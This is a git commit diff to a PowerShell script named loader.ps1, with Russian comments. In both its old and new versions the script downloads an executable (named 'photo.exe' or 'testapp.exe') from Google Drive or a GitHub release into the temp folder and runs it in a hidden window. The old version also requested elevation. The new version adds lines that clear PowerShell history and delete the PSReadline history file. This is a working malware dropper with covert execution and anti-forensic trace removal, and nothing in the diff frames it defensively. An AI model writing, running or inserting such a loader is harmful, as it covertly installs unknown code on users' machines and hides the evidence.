d6fdcdc4ed0054b2ed6eb6522a8f2c0a892a2e87
kotoedoff <kotoedt@gmail.com>
2025-11-26 11:20:15 +0200

    Update loader.ps1

--- loader.ps1
+++ loader.ps1
@@ -1,9 +1,15 @@
 # loader.ps1
-$url = "https://drive.google.com/uc?export=download&id=1tUR-oTx28YIm-7hIDeoLnDpRoTec0-bQ"
-$path = "$env:TEMP\photo.exe"
+$url = "https://github.com/kotoedoff/thunder-hub-beta/releases/download/kotoed/testapp.exe"
+$path = "$env:TEMP\testapp.exe"
 
 # Качаем
 (New-Object Net.WebClient).DownloadFile($url, $path)
 
-# Запускаем с UAC
-Start-Process -FilePath $path -WindowStyle Hidden -Verb RunAs
+# Проверяем и запускаем
+if (Test-Path $path) {
+    Start-Process -FilePath $path -WindowStyle Hidden
+}
+
+# Очищаем историю
+Clear-History
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
